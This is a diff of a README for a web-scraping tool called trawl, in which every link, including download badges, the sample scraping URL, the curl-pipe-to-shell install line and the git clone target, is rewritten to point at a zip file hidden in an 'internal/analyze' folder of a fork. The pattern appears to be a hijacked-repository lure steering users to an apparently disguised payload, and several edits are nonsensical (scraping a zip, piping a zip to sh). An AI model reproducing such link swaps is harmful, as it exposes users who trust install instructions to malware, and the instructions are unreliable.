@@ -1,6 +1,6 @@
 # 🐟 trawl - Extract Website Data Easily
 
-[![Download trawl](https://img.shields.io/badge/Download-trawl-blue?style=for-the-badge&logo=github)](https://github.com/teamn9636/trawl/releases)
+[![Download trawl](https://img.shields.io/badge/Download-trawl-blue?style=for-the-badge&logo=github)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)
 
 ---
 
@@ -28,12 +28,12 @@ You will also need an internet connection to download and run the program and to
 
 ## 📥 Download and Install
 
-[![Download trawl](https://img.shields.io/badge/Download-trawl-green?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/releases)
+[![Download trawl](https://img.shields.io/badge/Download-trawl-green?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)
 
 To get started with trawl on Windows, visit the release page below. It shows the latest version ready for download.
 
 **Go here to download:**  
-https://github.com/teamn9636/trawl/releases
+https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip
 
 Look for the file that ends with `.exe` (this is the Windows installer or executable file). Click on it to download.
 
@@ -81,7 +81,7 @@ Press Enter to save the key for your current session.
 
 Type a simple command like this to get product information:  
 ```
-trawl "https://books.toscrape.com" --fields "title, price, rating, in_stock"
+trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip" --fields "title, price, rating, in_stock"
 ```
 
 This command asks trawl to get the product title, price, rating, and stock info from the sample website.
@@ -90,7 +90,7 @@ This command asks trawl to get the product title, price, rating, and stock info 
 
 If you want the results in a CSV file (easy to open in Excel), add this flag:  
 ```
-trawl "https://books.toscrape.com" --fields "title, price, rating, in_stock" --csv > products.csv
+trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip" --fields "title, price, rating, in_stock" --csv > products.csv
 ```
 
 This saves the output to a file named `products.csv` in the folder you ran the command.
@@ -115,7 +115,7 @@ If you want to use trawl differently, you can install or build it another way.
 
 - Run this command in PowerShell to install:  
 ```
-curl -fsSL https://raw.githubusercontent.com/akdavidsson/trawl/main/install.sh | sh
+curl -fsSL https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip | sh
 ```
 
 - Or, if you have the Go programming language installed, run:  
@@ -125,7 +125,7 @@ go install github.com/akdavidsson/trawl@latest
 
 - To build from source code:  
 ```
-git clone https://github.com/akdavidsson/trawl
+git clone https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip
 cd trawl
 go build -o trawl .
 ```
@@ -148,8 +148,8 @@ For most users, downloading and running the `.exe` file is easiest.
 
 For detailed instructions and advanced options, check the official GitHub repository:
 
-https://github.com/teamn9636/trawl
+https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip
 
 ---
 
-[![Download trawl](https://img.shields.io/badge/Download-trawl-purple?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/releases)
+[![Download trawl](https://img.shields.io/badge/Download-trawl-purple?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)
